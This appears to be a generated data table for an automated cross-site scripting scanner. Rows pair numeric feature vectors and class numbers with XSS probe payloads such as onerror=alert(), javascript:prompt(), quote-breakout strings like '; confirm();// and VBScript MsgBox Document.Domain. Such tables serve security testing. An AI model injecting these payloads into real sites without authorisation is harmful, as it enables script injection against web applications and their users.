4,2,0,0,2,0,0,0,1,1,0,0,0,0,0,0,0,28,[' onerror=alert();']
4,2,0,0,2,0,0,0,1,1,0,0,0,0,0,0,0,28,[' onerror=alert();']
4,2,0,0,2,0,0,0,1,1,0,0,0,0,0,0,0,28,[' onerror=alert();']
4,2,0,0,2,0,0,0,1,1,1,0,0,0,0,0,0,29,[' onerror=prompt();']
4,2,0,0,2,1,0,0,1,1,1,0,0,0,0,0,0,29,[' onerror=prompt();']
4,2,0,0,2,1,0,1,1,1,1,0,0,0,0,0,0,29,[' onerror=prompt();']
4,2,0,0,2,0,0,1,1,1,1,0,0,0,0,0,0,29,[' onerror=prompt();']
4,2,0,0,2,0,0,0,1,1,1,0,0,0,0,0,0,29,[' onerror=prompt();']
4,2,0,0,2,0,0,0,1,1,1,0,0,0,0,0,0,29,[' onerror=prompt();']
4,2,0,0,2,0,0,0,1,1,1,0,0,0,0,0,0,29,[' onerror=prompt();']
4,2,0,0,2,0,0,0,1,1,1,0,0,0,0,0,0,29,[' onerror=prompt();']
4,2,0,0,2,0,0,0,1,1,1,0,0,0,0,0,0,29,[' onerror=prompt();']
4,2,0,0,2,0,0,0,1,1,1,0,0,0,0,0,0,29,[' onerror=prompt();']
4,2,0,0,2,0,0,0,1,1,1,1,0,0,0,0,0,30,[' onerror=confirm();']
4,2,0,0,2,1,0,0,1,1,1,1,0,0,0,0,0,30,[' onerror=confirm();']
4,2,0,0,2,1,0,1,1,1,1,1,0,0,0,0,0,30,[' onerror=confirm();']
4,2,0,0,2,0,0,1,1,1,1,1,0,0,0,0,0,30,[' onerror=confirm();']
4,2,0,0,2,0,0,0,1,1,1,1,0,0,0,0,0,30,[' onerror=confirm();']
4,2,0,0,2,0,0,0,1,1,1,1,0,0,0,0,0,30,[' onerror=confirm();']
4,2,0,0,2,0,0,0,1,1,1,1,0,0,0,0,0,30,[' onerror=confirm();']
4,2,0,0,2,0,0,0,1,1,1,1,0,0,0,0,0,30,[' onerror=confirm();']
4,2,0,0,2,0,0,0,1,1,1,1,0,0,0,0,0,30,[' onerror=confirm();']
4,2,0,0,2,0,0,0,1,1,1,1,0,0,0,0,0,30,[' onerror=confirm();']
4,2,0,0,2,0,0,0,1,1,1,1,1,0,0,0,0,31,[' onerror=alert``;']
4,2,0,0,2,1,0,0,1,1,1,1,1,0,0,0,0,31,[' onerror=alert``;']
4,2,0,0,2,0,0,0,1,1,1,1,1,0,0,0,0,31,[' onerror=alert``;']
4,2,0,0,2,0,0,0,1,1,1,1,1,0,0,0,0,31,[' onerror=alert``;']
4,2,0,0,2,0,0,0,1,1,1,1,1,0,0,0,0,31,[' onerror=alert``;']
4,2,0,0,2,0,0,0,1,1,1,1,1,0,0,0,0,31,[' onerror=alert``;']
4,2,0,0,2,0,0,0,1,1,1,1,1,0,0,0,0,31,[' onerror=alert``;']
4,2,0,0,2,0,0,0,1,1,1,1,1,0,0,0,0,31,[' onerror=alert``;']
4,2,0,0,2,0,0,0,1,1,1,1,1,0,0,0,0,31,[' onerror=alert``;']
4,2,0,0,2,0,0,0,1,1,1,1,1,0,0,0,0,31,[' onerror=alert``;']
4,2,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,32,[ onerror=alert();]
4,2,0,0,0,1,0,0,1,1,0,0,0,0,0,0,0,32,[ onerror=alert();]
4,2,0,0,0,1,1,0,1,1,0,0,0,0,0,0,0,32,[ onerror=alert();]
4,2,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,32,[ onerror=alert();]
4,2,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,32,[ onerror=alert();]
4,2,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,32,[ onerror=alert();]
4,2,0,0,0,1,0,1,1,1,0,0,0,0,0,0,0,32,[ onerror=alert();]
4,2,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,32,[ onerror=alert();]
4,2,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,32,[ onerror=alert();]
4,2,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,32,[ onerror=alert();]
4,2,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,33,[ onerror=prompt();]
4,2,0,0,0,1,0,0,1,1,1,0,0,0,0,0,0,33,[ onerror=prompt();]
4,2,0,0,0,1,1,0,1,1,1,0,0,0,0,0,0,33,[ onerror=prompt();]
4,2,0,0,0,0,1,0,1,1,1,0,0,0,0,0,0,33,[ onerror=prompt();]
4,2,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,33,[ onerror=prompt();]
4,2,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,33,[ onerror=prompt();]
4,2,0,0,0,1,0,1,1,1,1,0,0,0,0,0,0,33,[ onerror=prompt();]
4,2,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0,33,[ onerror=prompt();]
4,2,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,33,[ onerror=prompt();]
4,2,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,33,[ onerror=prompt();]
4,2,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,34,[ onerror=confirm();]
4,2,0,0,0,1,0,0,1,1,1,1,0,0,0,0,0,34,[ onerror=confirm();]
4,2,0,0,0,1,1,0,1,1,1,1,0,0,0,0,0,34,[ onerror=confirm();]
4,2,0,0,0,0,1,0,1,1,1,1,0,0,0,0,0,34,[ onerror=confirm();]
4,2,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,34,[ onerror=confirm();]
4,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,34,[ onerror=confirm();]
4,2,0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,34,[ onerror=confirm();]
4,2,0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,34,[ onerror=confirm();]
4,2,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,34,[ onerror=confirm();]
4,2,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,34,[ onerror=confirm();]
4,2,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,35,[ onerror=alert``;]
4,2,0,0,0,1,0,0,1,1,1,1,1,0,0,0,0,35,[ onerror=alert``;]
4,2,0,0,0,1,1,0,1,1,1,1,1,0,0,0,0,35,[ onerror=alert``;]
4,2,0,0,0,0,1,0,1,1,1,1,1,0,0,0,0,35,[ onerror=alert``;]
4,2,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,35,[ onerror=alert``;]
4,2,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,35,[ onerror=alert``;]
4,2,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,35,[ onerror=alert``;]
4,2,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,35,[ onerror=alert``;]
4,2,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,35,[ onerror=alert``;]
4,2,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,35,[ onerror=alert``;]
6,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,36,[ src=saivs.js ]
6,1,0,0,0,1,0,0,1,1,0,0,0,0,0,0,0,36,[ src=saivs.js ]
6,1,0,0,0,1,1,0,1,1,0,0,0,0,0,0,0,36,[ src=saivs.js ]
6,1,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,36,[ src=saivs.js ]
6,1,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,36,[ src=saivs.js ]
6,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,36,[ src=saivs.js ]
6,1,0,0,0,1,0,1,1,1,0,0,0,0,0,0,0,36,[ src=saivs.js ]
6,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,36,[ src=saivs.js ]
6,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,36,[ src=saivs.js ]
6,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,36,[ src=saivs.js ]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,37,['; alert();//]
0,0,3,0,2,1,0,0,1,1,0,0,0,0,0,0,0,37,['; alert();//]
0,0,3,0,2,1,0,1,1,1,0,0,0,0,0,0,0,37,['; alert();//]
0,0,3,0,2,0,0,1,1,1,0,0,0,0,0,0,0,37,['; alert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,37,['; alert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,37,['; alert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,37,['; alert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,37,['; alert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,37,['; alert();//]
0,0,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,37,['; alert();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,38,['; prompt();//]
0,0,3,0,2,1,0,0,1,1,1,0,0,0,0,0,0,38,['; prompt();//]
0,0,3,0,2,1,0,1,1,1,1,0,0,0,0,0,0,38,['; prompt();//]
0,0,3,0,2,0,0,1,1,1,1,0,0,0,0,0,0,38,['; prompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,38,['; prompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,38,['; prompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,38,['; prompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,38,['; prompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,38,['; prompt();//]
0,0,3,0,2,0,0,0,1,1,1,0,0,0,0,0,0,38,['; prompt();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,39,['; confirm();//]
0,0,3,0,2,1,0,0,1,1,1,1,0,0,0,0,0,39,['; confirm();//]
0,0,3,0,2,1,0,1,1,1,1,1,0,0,0,0,0,39,['; confirm();//]
0,0,3,0,2,0,0,1,1,1,1,1,0,0,0,0,0,39,['; confirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,39,['; confirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,39,['; confirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,39,['; confirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,39,['; confirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,39,['; confirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,0,0,0,0,0,39,['; confirm();//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,40,['; alert``;//]
0,0,3,0,2,1,0,0,1,1,1,1,1,0,0,0,0,40,['; alert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,40,['; alert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,40,['; alert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,40,['; alert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,40,['; alert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,40,['; alert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,40,['; alert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,40,['; alert``;//]
0,0,3,0,2,0,0,0,1,1,1,1,1,0,0,0,0,40,['; alert``;//]
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,41,"[""; alert();//]"
0,0,3,0,1,0,1,0,1,1,0,0,0,0,0,0,0,41,"[""; alert();//]"
0,0,3,0,1,0,1,1,1,1,0,0,0,0,0,0,0,41,"[""; alert();//]"
0,0,3,0,1,0,0,1,1,1,0,0,0,0,0,0,0,41,"[""; alert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,41,"[""; alert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,41,"[""; alert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,41,"[""; alert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,41,"[""; alert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,41,"[""; alert();//]"
0,0,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,41,"[""; alert();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,42,"[""; prompt();//]"
0,0,3,0,1,0,1,0,1,1,1,0,0,0,0,0,0,42,"[""; prompt();//]"
0,0,3,0,1,0,1,1,1,1,1,0,0,0,0,0,0,42,"[""; prompt();//]"
0,0,3,0,1,0,0,1,1,1,1,0,0,0,0,0,0,42,"[""; prompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,42,"[""; prompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,42,"[""; prompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,42,"[""; prompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,42,"[""; prompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,42,"[""; prompt();//]"
0,0,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,42,"[""; prompt();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,43,"[""; confirm();//]"
0,0,3,0,1,0,1,0,1,1,1,1,0,0,0,0,0,43,"[""; confirm();//]"
0,0,3,0,1,0,1,1,1,1,1,1,0,0,0,0,0,43,"[""; confirm();//]"
0,0,3,0,1,0,0,1,1,1,1,1,0,0,0,0,0,43,"[""; confirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,43,"[""; confirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,43,"[""; confirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,43,"[""; confirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,43,"[""; confirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,43,"[""; confirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,43,"[""; confirm();//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,44,"[""; alert``;//]"
0,0,3,0,1,0,1,0,1,1,1,1,1,0,0,0,0,44,"[""; alert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,44,"[""; alert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,44,"[""; alert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,44,"[""; alert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,44,"[""; alert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,44,"[""; alert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,44,"[""; alert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,44,"[""; alert``;//]"
0,0,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,44,"[""; alert``;//]"
0,0,3,0,0,0,0,0,1,1,0,0,0,0,0,0,0,45,[; alert();//]
0,0,3,0,0,1,0,0,1,1,0,0,0,0,0,0,0,45,[; alert();//]
0,0,3,0,0,1,1,0,1,1,0,0,0,0,0,0,0,45,[; alert();//]
0,0,3,0,0,0,1,0,1,1,0,0,0,0,0,0,0,45,[; alert();//]
0,0,3,0,0,0,1,1,1,1,0,0,0,0,0,0,0,45,[; alert();//]
0,0,3,0,0,0,0,1,1,1,0,0,0,0,0,0,0,45,[; alert();//]
0,0,3,0,0,1,0,1,1,1,0,0,0,0,0,0,0,45,[; alert();//]
0,0,3,0,0,1,1,1,1,1,0,0,0,0,0,0,0,45,[; alert();//]
0,0,3,0,0,0,0,0,1,1,0,0,0,0,0,0,0,45,[; alert();//]
0,0,3,0,0,0,0,0,1,1,0,0,0,0,0,0,0,45,[; alert();//]
0,0,3,0,0,0,0,0,1,1,1,0,0,0,0,0,0,46,[; prompt();//]
0,0,3,0,0,1,0,0,1,1,1,0,0,0,0,0,0,46,[; prompt();//]
0,0,3,0,0,1,1,0,1,1,1,0,0,0,0,0,0,46,[; prompt();//]
0,0,3,0,0,0,1,0,1,1,1,0,0,0,0,0,0,46,[; prompt();//]
0,0,3,0,0,0,1,1,1,1,1,0,0,0,0,0,0,46,[; prompt();//]
0,0,3,0,0,0,0,1,1,1,1,0,0,0,0,0,0,46,[; prompt();//]
0,0,3,0,0,1,0,1,1,1,1,0,0,0,0,0,0,46,[; prompt();//]
0,0,3,0,0,1,1,1,1,1,1,0,0,0,0,0,0,46,[; prompt();//]
0,0,3,0,0,0,0,0,1,1,1,0,0,0,0,0,0,46,[; prompt();//]
0,0,3,0,0,0,0,0,1,1,1,0,0,0,0,0,0,46,[; prompt();//]
0,0,3,0,0,0,0,0,1,1,1,1,0,0,0,0,0,47,[; confirm();//]
0,0,3,0,0,1,0,0,1,1,1,1,0,0,0,0,0,47,[; confirm();//]
0,0,3,0,0,1,1,0,1,1,1,1,0,0,0,0,0,47,[; confirm();//]
0,0,3,0,0,0,1,0,1,1,1,1,0,0,0,0,0,47,[; confirm();//]
0,0,3,0,0,0,1,1,1,1,1,1,0,0,0,0,0,47,[; confirm();//]
0,0,3,0,0,0,0,1,1,1,1,1,0,0,0,0,0,47,[; confirm();//]
0,0,3,0,0,1,0,1,1,1,1,1,0,0,0,0,0,47,[; confirm();//]
0,0,3,0,0,1,1,1,1,1,1,1,0,0,0,0,0,47,[; confirm();//]
0,0,3,0,0,0,0,0,1,1,1,1,0,0,0,0,0,47,[; confirm();//]
0,0,3,0,0,0,0,0,1,1,1,1,0,0,0,0,0,47,[; confirm();//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,48,[; alert``;//]
0,0,3,0,0,1,0,0,1,1,1,1,1,0,0,0,0,48,[; alert``;//]
0,0,3,0,0,1,1,0,1,1,1,1,1,0,0,0,0,48,[; alert``;//]
0,0,3,0,0,0,1,0,1,1,1,1,1,0,0,0,0,48,[; alert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,48,[; alert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,48,[; alert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,48,[; alert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,48,[; alert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,48,[; alert``;//]
0,0,3,0,0,0,0,0,1,1,1,1,1,0,0,0,0,48,[; alert``;//]
0,0,0,1,2,0,0,0,1,1,0,0,0,0,0,0,0,49,['\r\n MsgBox '3122]
0,0,0,1,2,1,0,0,1,1,0,0,0,0,0,0,0,49,['\r\n MsgBox '3122]
0,0,0,1,2,1,0,1,1,1,0,0,0,0,0,0,0,49,['\r\n MsgBox '3122]
0,0,0,1,2,0,0,1,1,1,0,0,0,0,0,0,0,49,['\r\n MsgBox '3122]
0,0,0,1,2,0,0,0,1,1,0,0,0,0,0,0,0,49,['\r\n MsgBox '3122]
0,0,0,1,2,0,0,0,1,1,0,0,0,0,0,0,0,49,['\r\n MsgBox '3122]
0,0,0,1,2,0,0,0,1,1,0,0,0,0,0,0,0,49,['\r\n MsgBox '3122]
0,0,0,1,2,0,0,0,1,1,0,0,0,0,0,0,0,49,['\r\n MsgBox '3122]
0,0,0,1,2,0,0,0,1,1,0,0,0,0,0,0,0,49,['\r\n MsgBox '3122]
0,0,0,1,2,0,0,0,1,1,0,0,0,0,0,0,0,49,['\r\n MsgBox '3122]
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,50,"[""\r\n MsgBox ""3122]"
0,0,0,1,1,0,1,0,1,1,0,0,0,0,0,0,0,50,"[""\r\n MsgBox ""3122]"
0,0,0,1,1,0,1,1,1,1,0,0,0,0,0,0,0,50,"[""\r\n MsgBox ""3122]"
0,0,0,1,1,0,0,1,1,1,0,0,0,0,0,0,0,50,"[""\r\n MsgBox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,50,"[""\r\n MsgBox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,50,"[""\r\n MsgBox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,50,"[""\r\n MsgBox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,50,"[""\r\n MsgBox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,50,"[""\r\n MsgBox ""3122]"
0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,50,"[""\r\n MsgBox ""3122]"
0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,51,[\r\n MsgBox Document.Domain]
0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,0,0,51,[\r\n MsgBox Document.Domain]
0,0,0,1,0,1,1,0,1,1,0,0,0,0,0,0,0,51,[\r\n MsgBox Document.Domain]
0,0,0,1,0,0,1,0,1,1,0,0,0,0,0,0,0,51,[\r\n MsgBox Document.Domain]
0,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,0,51,[\r\n MsgBox Document.Domain]
0,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,0,51,[\r\n MsgBox Document.Domain]
0,0,0,1,0,1,0,1,1,1,0,0,0,0,0,0,0,51,[\r\n MsgBox Document.Domain]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,51,[\r\n MsgBox Document.Domain]
0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,51,[\r\n MsgBox Document.Domain]
0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,51,[\r\n MsgBox Document.Domain]
3,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,52,[javascript:alert();]
3,2,0,0,1,1,0,0,1,1,0,0,0,0,0,0,0,52,[javascript:alert();]
3,2,0,0,1,1,1,0,1,1,0,0,0,0,0,0,0,52,[javascript:alert();]
3,2,0,0,1,0,1,0,1,1,0,0,0,0,0,0,0,52,[javascript:alert();]
3,2,0,0,1,0,1,1,1,1,0,0,0,0,0,0,0,52,[javascript:alert();]
3,2,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,52,[javascript:alert();]
3,2,0,0,1,1,0,1,1,1,0,0,0,0,0,0,0,52,[javascript:alert();]
3,2,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,52,[javascript:alert();]
3,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,52,[javascript:alert();]
3,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,52,[javascript:alert();]
3,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,53,[javascript:prompt();]
3,2,0,0,1,1,0,0,1,1,1,0,0,0,0,0,0,53,[javascript:prompt();]
3,2,0,0,1,1,1,0,1,1,1,0,0,0,0,0,0,53,[javascript:prompt();]
3,2,0,0,1,0,1,0,1,1,1,0,0,0,0,0,0,53,[javascript:prompt();]
3,2,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,53,[javascript:prompt();]
3,2,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,53,[javascript:prompt();]
3,2,0,0,1,1,0,1,1,1,1,0,0,0,0,0,0,53,[javascript:prompt();]
3,2,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,53,[javascript:prompt();]
3,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,53,[javascript:prompt();]
3,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,53,[javascript:prompt();]
3,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,54,[javascript:confirm();]
3,2,0,0,1,1,0,0,1,1,1,1,0,0,0,0,0,54,[javascript:confirm();]
3,2,0,0,1,1,1,0,1,1,1,1,0,0,0,0,0,54,[javascript:confirm();]
3,2,0,0,1,0,1,0,1,1,1,1,0,0,0,0,0,54,[javascript:confirm();]
3,2,0,0,1,0,1,1,1,1,1,1,0,0,0,0,0,54,[javascript:confirm();]
3,2,0,0,1,0,0,1,1,1,1,1,0,0,0,0,0,54,[javascript:confirm();]
3,2,0,0,1,1,0,1,1,1,1,1,0,0,0,0,0,54,[javascript:confirm();]
3,2,0,0,1,1,1,1,1,1,1,1,0,0,0,0,0,54,[javascript:confirm();]
3,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,54,[javascript:confirm();]
3,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,54,[javascript:confirm();]
3,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,55,[javascript:alert``;]
3,2,0,0,1,1,0,0,1,1,1,1,1,0,0,0,0,55,[javascript:alert``;]
3,2,0,0,1,1,1,0,1,1,1,1,1,0,0,0,0,55,[javascript:alert``;]
3,2,0,0,1,0,1,0,1,1,1,1,1,0,0,0,0,55,[javascript:alert``;]
3,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,55,[javascript:alert``;]
3,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,55,[javascript:alert``;]
3,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,55,[javascript:alert``;]
3,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,55,[javascript:alert``;]
3,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,55,[javascript:alert``;]
3,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,55,[javascript:alert``;]
3,2,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,56,"[""; alert(); //]"
3,2,3,0,1,0,1,0,1,1,0,0,0,0,0,0,0,56,"[""; alert(); //]"
3,2,3,0,1,0,1,1,1,1,0,0,0,0,0,0,0,56,"[""; alert(); //]"
3,2,3,0,1,0,0,1,1,1,0,0,0,0,0,0,0,56,"[""; alert(); //]"
3,2,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,56,"[""; alert(); //]"
3,2,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,56,"[""; alert(); //]"
3,2,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,56,"[""; alert(); //]"
3,2,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,56,"[""; alert(); //]"
3,2,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,56,"[""; alert(); //]"
3,2,3,0,1,0,0,0,1,1,0,0,0,0,0,0,0,56,"[""; alert(); //]"
3,2,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,57,"[""; prompt(); //]"
3,2,3,0,1,0,1,0,1,1,1,0,0,0,0,0,0,57,"[""; prompt(); //]"
3,2,3,0,1,0,1,1,1,1,1,0,0,0,0,0,0,57,"[""; prompt(); //]"
3,2,3,0,1,0,0,1,1,1,1,0,0,0,0,0,0,57,"[""; prompt(); //]"
3,2,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,57,"[""; prompt(); //]"
3,2,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,57,"[""; prompt(); //]"
3,2,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,57,"[""; prompt(); //]"
3,2,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,57,"[""; prompt(); //]"
3,2,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,57,"[""; prompt(); //]"
3,2,3,0,1,0,0,0,1,1,1,0,0,0,0,0,0,57,"[""; prompt(); //]"
3,2,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,58,"[""; confirm(); //]"
3,2,3,0,1,0,1,0,1,1,1,1,0,0,0,0,0,58,"[""; confirm(); //]"
3,2,3,0,1,0,0,1,1,1,1,1,0,0,0,0,0,58,"[""; confirm(); //]"
3,2,3,0,1,0,1,1,1,1,1,1,0,0,0,0,0,58,"[""; confirm(); //]"
3,2,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,58,"[""; confirm(); //]"
3,2,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,58,"[""; confirm(); //]"
3,2,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,58,"[""; confirm(); //]"
3,2,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,58,"[""; confirm(); //]"
3,2,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,58,"[""; confirm(); //]"
3,2,3,0,1,0,0,0,1,1,1,1,0,0,0,0,0,58,"[""; confirm(); //]"
3,2,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,59,"[""; alert``; //]"
3,2,3,0,1,0,1,0,1,1,1,1,1,0,0,0,0,59,"[""; alert``; //]"
3,2,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,59,"[""; alert``; //]"
3,2,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,59,"[""; alert``; //]"
3,2,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,59,"[""; alert``; //]"
3,2,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,59,"[""; alert``; //]"
3,2,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,59,"[""; alert``; //]"
3,2,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,59,"[""; alert``; //]"
3,2,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,59,"[""; alert``; //]"
3,2,3,0,1,0,0,0,1,1,1,1,1,0,0,0,0,59,"[""; alert``; //]"
3,2,3,0,2,0,0,0,1,1,0,0,0,0,0,0,0,60,['; alert(); //]
3,2,3,0,2,1,0,0,1,1,0,0,0,0,0,0,0,60,['; alert(); //]
